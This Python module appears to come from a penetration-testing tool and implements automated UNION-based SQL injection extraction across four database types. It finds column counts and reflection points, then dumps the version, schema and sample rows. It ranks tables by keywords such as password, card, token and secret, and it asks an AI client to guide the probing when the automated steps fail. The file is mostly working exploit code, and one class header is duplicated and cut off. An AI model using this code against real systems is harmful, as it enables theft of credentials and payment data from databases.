"""
SQLi data extraction engine.

Standalone module — does NOT make HTTP requests directly. It receives
an `inject_fn` callback from the calling plugin and uses it to fire
UNION SELECT payloads and read back reflected values. This keeps the
extraction logic independently testable.

Usage from sqli.py:

    extractor = SQLiExtractor(
        inject_fn=my_inject_fn,   # async (payload: str) -> str
        db_type="postgresql",     # auto-detected by the calling plugin
        config=extraction_config, # dict from settings.plugins["sqli"]["extraction"]
    )
    result = await extractor.run()

Extraction is fully general-purpose:
  - No hardcoded table names or column counts.
  - Auto-enumerates UNION column count (1–15).
  - Extracts DB version, all table names, column names per table, and
    sample rows from tables whose names match high-value keywords.
  - Results land in Finding.evidence (human-readable) and
    Finding.extracted_data (structured JSON).

Opt-in: only runs when `extraction.enabled: true` AND
`engagement.allow_active_payloads: true`. Both must be set.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Awaitable, Callable

from stelarstrike.utils.logger import get_logger

log = get_logger(__name__)

_HIGH_VALUE_KEYWORDS = [
    "user", "admin", "auth", "login", "credential", "password",
    "account", "card", "transaction", "payment", "merchant",
    "token", "session", "secret", "key", "api", "customer",
    "member", "profile", "setting", "config", "order",
]

# DB-specific SQL building blocks
_DB_BUILDERS: dict[str, dict[str, str]] = {
    "postgresql": {
        "version":        "version()",
        "table_names":    "string_agg(tablename,' ' ORDER BY tablename)",
        "table_schema":   "pg_tables",
        "schema_filter":  "schemaname='public'",
        "table_col":      "tablename",
        "col_agg":        "string_agg(column_name,' ' ORDER BY ordinal_position)",
        "col_table":      "information_schema.columns",
        "col_filter":     "table_name='{table}'",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "-- -",
    },
    "mysql": {
        "version":        "version()",
        "table_names":    "group_concat(table_name ORDER BY table_name SEPARATOR ' ')",
        "table_schema":   "information_schema.tables",
        "schema_filter":  "table_schema=database()",
        "table_col":      "table_name",
        "col_agg":        "group_concat(column_name ORDER BY ordinal_position SEPARATOR ' ')",
        "col_table":      "information_schema.columns",
        "col_filter":     "table_name='{table}' AND table_schema=database()",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "-- -",
    },
    "mssql": {
        "version":        "@@version",
        "table_names":    "string_agg(name,'|')",
        "table_schema":   "sysobjects",
        "schema_filter":  "xtype='U'",
        "table_col":      "name",
        "col_agg":        "string_agg(name,'|')",
        "col_table":      "sys.columns",
        "col_filter":     "object_id=OBJECT_ID('{table}')",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "--",
    },
    "sqlite": {
        "version":        "sqlite_version()",
        "table_names":    "group_concat(name,' ')",
        "table_schema":   "sqlite_master",
        "schema_filter":  "type='table'",
        "table_col":      "name",
        "col_agg":        "group_concat(name,' ')",
        "col_table":      "pragma_table_info('{table}')",
        "col_filter":     "",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "--",
    },
}


@dataclass
class ExtractionResult:
    db_version: str = ""
    db_type: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    data: dict[str, list[dict]] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "db_version": self.db_version,
            "db_type":    self.db_type,
            "tables":     self.tables,
            "columns":    self.columns,
            "data":       self.data,
        }

    def summary(self) -> str:
        lines = [
            f"Database: {self.db_type} {self.db_version}",
            f"Tables found ({len(self.tables)}): {', '.join(self.tables) or 'none'}",
        ]
        for table in self.tables:
            cols = self.columns.get(table, [])
            rows = self.data.get(table, [])
            lines.append(f"\n  [{table}] — {len(cols)} column(s), {len(rows)} row(s) sampled")
            if cols:
                lines.append(f"    Columns: {', '.join(cols)}")
            for row in rows[:5]:
                preview = {k: str(v)[:60] for k, v in row.items()}
                lines.append(f"    {preview}")
            if len(rows) > 5:
                lines.append(f"    ... and {len(rows) - 5} more row(s)")
        return "\n".join(lines)


class SQLiExtractor:
    def __init__(
        self,
        inject_fn: Callable[[str], Awaitable[str]],
        db_type: str,
        config: dict,
    ):
        self.inject = inject_fn
    def __init__(
        self,
        inject_fn: Callable[[str], Awaitable[str]],
        db_type: str,
        config: dict,
        ai_client=None,  # optional callable(prompt: str) -> str for guided fallback
    ):
        self.inject = inject_fn
        self.db_type = db_type if db_type in _DB_BUILDERS else "postgresql"
        self.config = config
        self.db = _DB_BUILDERS[self.db_type]
        self.result = ExtractionResult(db_type=self.db_type)
        self._col_count: int | None = None
        self._reflected_col: int | None = None
        self._inject_prefix: str = "'"
        self._try_positions_first: list[int] = []  # schema hint: probe these positions first
        self.ai_client = ai_client

    async def run(self) -> ExtractionResult:
        """Run the full extraction pipeline and return the result."""
        extract_goals = self.config.get("extract", ["version", "schema"])

        if "version" in extract_goals:
            self.result.db_version = await self._get_version() or "unknown"

        if "schema" in extract_goals:
            self.result.tables = await self._get_tables()

        target_tables = self._rank_tables()
        max_tables = int(self.config.get("max_tables", 20))

        for table in target_tables[:max_tables]:
            cols = await self._get_columns(table)
            if cols:
                self.result.columns[table] = cols

        max_rows = int(self.config.get("max_rows_per_table", 50))
        for table in target_tables[:max_tables]:
            cols = self.result.columns.get(table, [])
            if not cols:
                continue
            rows = await self._get_table_data(table, cols, limit=max_rows)
            if rows:
                self.result.data[table] = rows

        return self.result

    # ---------------------------------------------------------------
    # Public single-step helpers (used by tests)
    # ---------------------------------------------------------------

    async def _get_version(self) -> str:
        return await self._union_scalar(self.db["version"])

    async def _get_tables(self) -> list[str]:
        d = self.db
        if self.db_type == "sqlite":
            subquery = f"(SELECT {d['table_names']} FROM {d['table_schema']} WHERE {d['schema_filter']})"
        else:
            subquery = f"(SELECT {d['table_names']} FROM {d['table_schema']} WHERE {d['schema_filter']})"
        raw = await self._union_scalar(subquery)
        if not raw:
            return []
        sep = "|" if self.db_type == "mssql" else " "
        return [t.strip() for t in raw.split(sep) if t.strip()]

    async def _get_columns(self, table: str) -> list[str]:
        d = self.db
        col_filter = d["col_filter"].format(table=table)

        if self.db_type == "sqlite":
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table'].format(table=table)})"
        elif col_filter:
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table']} WHERE {col_filter})"
        else:
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table']})"

        raw = await self._union_scalar(subquery)
        if not raw:
            return []
        sep = "|" if self.db_type == "mssql" else " "
        return [c.strip() for c in raw.split(sep) if c.strip()]

    async def _get_table_data(self, table: str, columns: list[str], limit: int = 50) -> list[dict]:
        if not columns:
            return []
        max_cols = int(self.config.get("max_columns_per_table", 30))
        cols = columns[:max_cols]

        if self.db_type == "postgresql":
            parts = [f"COALESCE({c}::text,'NULL')" for c in cols]
            concat = "||':'||".join(parts)
            subquery = (
                f"(SELECT string_agg({concat},'|||') "
                f"FROM (SELECT {','.join(cols)} FROM {table} LIMIT {limit}) sub)"
            )
        elif self.db_type == "mysql":
            parts = [f"COALESCE({c},'NULL')" for c in cols]
            concat = f"CONCAT_WS(':',{','.join(parts)})"
            subquery = (
                f"(SELECT GROUP_CONCAT({concat} SEPARATOR '|||') "
                f"FROM (SELECT {','.join(cols)} FROM {table} LIMIT {limit}) sub)"
            )
        else:
            return []  # MSSQL/SQLite row extraction is complex — schema is sufficient proof

        raw = await self._union_scalar(subquery)
        if not raw:
            return []

        rows = []
        for row_str in raw.split("|||"):
            values = row_str.split(":")
            row = {col: (None if values[i] == "NULL" else values[i]) if i < len(values) else None
                   for i, col in enumerate(cols)}
            rows.append(row)
        return rows

    # ---------------------------------------------------------------
    # Core UNION injection
    # ---------------------------------------------------------------

    # Sentinel markers
    _SENTINEL_START = "STELR0"
    _SENTINEL_END   = "0RLETS"
    _LITERAL_PROBE  = "STELRPROBE"  # used in Phase 2 — no concat syntax, just a plain string

    _MISMATCH_SIGNALS = (
        "same number of columns",
        "each union query must have",
        "different number of columns",
        "number of columns",
        "must have the same",
    )
    _TYPE_ERROR_SIGNALS = (
        "invalid input syntax for type integer",
        "integer out of range",
        "invalid input syntax for",
        "union types",
        "conversion failed",
    )

    def _wrap_sentinel(self, subquery: str) -> str:
        s, e = self._SENTINEL_START, self._SENTINEL_END
        if self.db_type in ("postgresql", "sqlite"):
            return f"'{s}'||({subquery})||'{e}'"
        if self.db_type == "mysql":
            return f"CONCAT('{s}',({subquery}),'{e}')"
        if self.db_type == "mssql":
            return f"'{s}'+CAST(({subquery}) AS NVARCHAR(MAX))+'{e}'"
        return f"'{s}'||({subquery})||'{e}'"

    def _build_union(self, col_count: int, position: int, value_expr: str, comment: str, prefix: str = "'") -> str:
        parts = ["NULL"] * col_count
        parts[position] = value_expr
        return f"{prefix} UNION SELECT {','.join(parts)}{comment}"

    async def _find_col_count_and_position(self, wrapped: str, comment: str) -> bool:
        """
        Three-phase UNION discovery.

        Phase 1: NULL-only probes to confirm column count (type-safe, fast).
        Phase 2: Literal string probe at each position to find reflection point
                 WITHOUT DB-specific concat syntax — avoids type errors and syntax
                 differences across MySQL/PostgreSQL/SQLite/MSSQL.
        Phase 3: Verify with actual sentinel-wrapped subquery at the confirmed position.

        Falls back to AI-guided analysis if all probes fail.
        """
        prefixes = [("'", "string"), (" ", "numeric"), ("')", "paren")]
        working_combos: list[tuple[int, str]] = []  # (col_count, prefix) that passed phase 1

        # Phase 1: find all viable column counts
        for prefix, ctx_label in prefixes:
            for col_count in range(1, 16):
                null_payload = f"{prefix} UNION SELECT {','.join(['NULL']*col_count)}{comment}"
                try:
                    resp = await self.inject(null_payload)
                except Exception as exc:
                    log.debug(f"sqli-extract: null probe failed ({ctx_label}, n={col_count}): {exc}")
                    continue

                lower = resp.lower()
                if any(s in lower for s in self._MISMATCH_SIGNALS):
                    log.debug(f"sqli-extract: col_count={col_count} mismatch ({ctx_label})")
                    continue

                log.debug(f"sqli-extract: col_count={col_count} candidate ({ctx_label})")
                working_combos.append((col_count, prefix, ctx_label))
                break  # found one per prefix context, move to next

        if not working_combos:
            log.debug("sqli-extract: Phase 1 failed — no valid column count found")
            if self.ai_client:
                return await self._ai_guided_recovery(comment, prefixes)
            return False

        # Phase 2: Literal string probe at each position (no concat syntax needed)
        # Hinted positions (from schema pattern) are tried first, then exhaustive.
        sample_responses: list[dict] = []

        for col_count, prefix, ctx_label in working_combos:
            all_pos = list(range(col_count))
            hinted = [p for p in self._try_positions_first if p < col_count]
            remaining = [p for p in all_pos if p not in hinted]
            ordered_positions = hinted + remaining
            if hinted:
                log.debug(f"sqli-extract: probing positions (hinted first): {ordered_positions}")

            for pos in ordered_positions:
                parts = ["NULL"] * col_count
                parts[pos] = f"'{self._LITERAL_PROBE}'"
                payload = f"{prefix} UNION SELECT {','.join(parts)}{comment}"
                try:
                    resp = await self.inject(payload)
                except Exception as exc:
                    log.debug(f"sqli-extract: literal probe failed (pos={pos}): {exc}")
                    continue

                sample_responses.append({
                    "payload": payload[:80],
                    "response": resp[:500],
                    "status": getattr(resp, "status_code", None),
                    "col_count": col_count,
                    "pos": pos,
                })

                if self._LITERAL_PROBE in resp:
                    log.info(
                        f"sqli-extract: ✓ literal probe reflected at pos={pos} "
                        f"(col_count={col_count}, {ctx_label})"
                    )
                    self._col_count = col_count
                    self._reflected_col = pos
                    self._inject_prefix = prefix

                    # Phase 3: Verify with actual sentinel+subquery
                    sentinel_payload = self._build_union(col_count, pos, wrapped, comment, prefix)
                    try:
                        sentinel_resp = await self.inject(sentinel_payload)
                        value = self._extract_value(sentinel_resp)
                        if value:
                            log.info("sqli-extract: ✓ sentinel extraction confirmed")
                            return True
                        # Literal worked but sentinel extraction didn't — try alternate concat
                        log.debug("sqli-extract: literal ok but sentinel extraction empty — trying alt")
                        for alt_wrapped in self._alt_sentinel_expressions(self.db["version"]):
                            alt_payload = self._build_union(col_count, pos, alt_wrapped, comment, prefix)
                            alt_resp = await self.inject(alt_payload)
                            value = self._extract_value(alt_resp)
                            if value:
                                log.info("sqli-extract: ✓ alt sentinel expression worked")
                                return True
                    except Exception as exc:
                        log.debug(f"sqli-extract: phase 3 sentinel probe failed: {exc}")

                    log.debug("sqli-extract: position confirmed but value extraction failed")
                    # Still return True — we know the position, extraction may work for other subqueries
                    return True

        # All probes failed — ask AI for guidance
        log.info("sqli-extract: automated probes exhausted — requesting AI guidance")
        if self.ai_client:
            return await self._ai_guided_recovery(comment, prefixes, sample_responses)

        log.debug("sqli-extract: no AI client configured — extraction cannot continue")
        return False

    def _alt_sentinel_expressions(self, subquery: str) -> list[str]:
        """Alternative sentinel wrapping expressions to try if primary fails."""
        s, e = self._SENTINEL_START, self._SENTINEL_END
        return [
            # Explicit CAST — avoids type issues
            f"CAST('{s}' AS TEXT)||CAST(({subquery}) AS TEXT)||CAST('{e}' AS TEXT)",
            # Implicit cast via concat with empty string
            f"('{s}'||CAST(({subquery}) AS VARCHAR)||'{e}')",
            # MySQL CONCAT
            f"CONCAT('{s}',CAST(({subquery}) AS CHAR),'{e}')",
            # Direct — no sentinel, just the value (extract_value falls back to JSON scan)
            f"({subquery})",
        ]

    async def _ai_guided_recovery(
        self,
        comment: str,
        prefixes: list,
        sample_responses: list[dict] | None = None,
    ) -> bool:
        """
        Ask AI to analyze probe responses and identify where injected values are reflected.
        Called only when all automated probes fail.
        """
        if not sample_responses:
            sample_responses = []
            for prefix, ctx_label in prefixes[:2]:
                for n in [3, 5, 8, 10, 12]:
                    cols_str = ",".join([f"'COL{i}'" for i in range(n)])
                    payload = f"{prefix} UNION SELECT {cols_str}{comment}"
                    try:
                        resp = await self.inject(payload)
                        sample_responses.append({
                            "payload": payload[:80],
                            "response": resp[:600],
                            "col_count": n,
                        })
                        if any(f"COL{i}" in resp for i in range(n)):
                            break
                    except Exception:
                        continue

        if not sample_responses:
            return False

        prompt = (
            "You are a penetration tester analyzing SQL injection probe responses.\n"
            "I sent UNION SELECT probes with placeholder values (COL0, COL1, COL2, ...) "
            "into an injectable parameter. The placeholders are in different column positions.\n\n"
            "Here are the probe results:\n\n"
        )
        for i, s in enumerate(sample_responses[:5]):
            prompt += f"Probe {i+1} (col_count={s['col_count']}): {s['payload']}\n"
            prompt += f"Response: {s['response'][:300]}\n\n"

        prompt += (
            "Which column position (0-indexed) is reflected in the responses? "
            "And what is the correct column count for the UNION?\n"
            "Reply in JSON only: {\"col_count\": N, \"reflected_col\": N, \"reasoning\": \"...\"}"
        )

        try:
            result_text = self.ai_client(prompt)
            import json as _json
            result_text = result_text.strip().lstrip("```json").lstrip("```").rstrip("```")
            hint = _json.loads(result_text)
            col_count = int(hint.get("col_count", 0))
            reflected_col = int(hint.get("reflected_col", 0))
            reasoning = hint.get("reasoning", "")

            if col_count > 0 and 0 <= reflected_col < col_count:
                log.info(
                    f"sqli-extract: AI hint — col_count={col_count}, "
                    f"reflected_col={reflected_col}: {reasoning}"
                )
                self._col_count = col_count
                self._reflected_col = reflected_col
                return True
        except Exception as exc:
            log.debug(f"sqli-extract: AI guidance failed: {exc}")

        return False

    async def _union_scalar(self, subquery: str) -> str:
        """
        Inject a UNION SELECT and return the reflected value.

        On first call, runs two-phase discovery to find (col_count, reflected_position).
        On subsequent calls, uses the cached values directly.
        """
        comment = self.db["comment"]
        wrapped = self._wrap_sentinel(subquery)

        # If we already know the working combination, use it directly
        if self._col_count is not None and self._reflected_col is not None:
            payload = self._build_union(self._col_count, self._reflected_col, wrapped, comment, self._inject_prefix)
            try:
                response = await self.inject(payload)
                value = self._extract_value(response)
                if value:
                    log.debug(f"sqli-extract: extracted (cached position): {value[:60]!r}")
                    return value
                # Cached position stopped working — reset and rediscover
                log.debug("sqli-extract: cached position no longer reflects — rediscovering")
                self._col_count = None
                self._reflected_col = None
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli-extract: cached inject failed: {exc}")
                return ""

        # Discovery phase
        found = await self._find_col_count_and_position(wrapped, comment)
        if not found:
            return ""

        # Now use the cached position to get the actual value
        payload = self._build_union(
            self._col_count, self._reflected_col, wrapped, comment, self._inject_prefix
        )
        try:
            response = await self.inject(payload)
            value = self._extract_value(response)
            if value:
                log.debug(f"sqli-extract: extracted value: {value[:80]!r}")
            return value
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli-extract: final extract inject failed: {exc}")
            return ""

    def _compat_cols(self, count: int) -> str:
        """NULL is type-agnostic and works across all SQL dialects for padding."""
        if count <= 0:
            return ""
        return ",".join(["NULL"] * count)

    def _extract_value(self, response_body: str) -> str:
        """
        Extract the injected value from the response.

        Primary: sentinel markers (STELR0...0RLETS) — reliable in both HTML and JSON.
        Fallback 1: JSON longest-string for clean API responses.
        Fallback 2: conservative regex (only when unambiguous).
        """
        s, e = self._SENTINEL_START, self._SENTINEL_END

        # Primary: sentinel search
        idx_start = response_body.find(s)
        if idx_start != -1:
            idx_end = response_body.find(e, idx_start + len(s))
            if idx_end != -1:
                extracted = response_body[idx_start + len(s):idx_end].strip()
                if extracted and not self._looks_like_error(extracted):
                    return extracted

        # Fallback 1: JSON response — return the longest non-error string value
        try:
            data = json.loads(response_body)
            val = self._longest_json_string(data)
            if val and len(val) > 5 and not self._looks_like_error(val):
                return val
        except (json.JSONDecodeError, TypeError, ValueError):
            pass

        return ""


    def _longest_json_string(self, obj) -> str:
        best = ""

        def walk(o):
            nonlocal best
            if isinstance(o, str):
                if len(o) > len(best):
                    best = o
            elif isinstance(o, dict):
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for item in o:
                    walk(item)

        walk(obj)
        return best

    @staticmethod
    def _looks_like_error(value: str) -> bool:
        indicators = ["error", "syntax", "exception", "traceback", "failed", "invalid"]
        lower = value.lower()
        return any(ind in lower for ind in indicators)

    def _rank_tables(self) -> list[str]:
        """Sort discovered tables by high-value keyword score, descending."""
        scored = []
        for table in self.result.tables:
            score = sum(1 for kw in _HIGH_VALUE_KEYWORDS if kw in table.lower())
            scored.append((score, table))
        scored.sort(reverse=True)
        return [t for _, t in scored]
